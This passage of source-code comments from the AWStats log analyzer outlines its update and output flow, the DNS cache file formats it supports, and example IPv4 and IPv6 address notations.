#   Rename all created tmp files
# End of 'update'
#
# &Init_HashArray()
#
# If 'output'
#   Loop for each month of required year
#     &Read_History_With_TmpUpdate($YearRequired,$monthloop,'','',NOUPDATE,NOPURGE,'all' or 'general time' if not required month)
#   End of loop
#   Show data arrays in HTML page
#   html_end
# End of 'output'
#-------------------------------------------------------

#-------------------------------------------------------
# DNS CACHE FILE FORMATS SUPPORTED BY AWSTATS
# Format /etc/hosts     x.y.z.w hostname
# Format analog         UT/60 x.y.z.w hostname
#-------------------------------------------------------

#-------------------------------------------------------
# IP Format (d=decimal on 16 bits, x=hexadecimal on 16 bits)
#
# 13.1.68.3						IPv4 (d.d.d.d)
# 0:0:0:0:0:0:13.1.68.3 		IPv6 (x:x:x:x:x:x:d.d.d.d)
# ::13.1.68.3
# 0:0:0:0:0:FFFF:13.1.68.3 		IPv6 (x:x:x:x:x:x:d.d.d.d)
# ::FFFF:13.1.68.3 				IPv6
#
# 1070:0:0:0:0:800:200C:417B 	IPv6
# 1070:0:0:0:0:800:200C:417B 	IPv6
# 1070::800:200C:417B 			IPv6
#-------------------------------------------------------
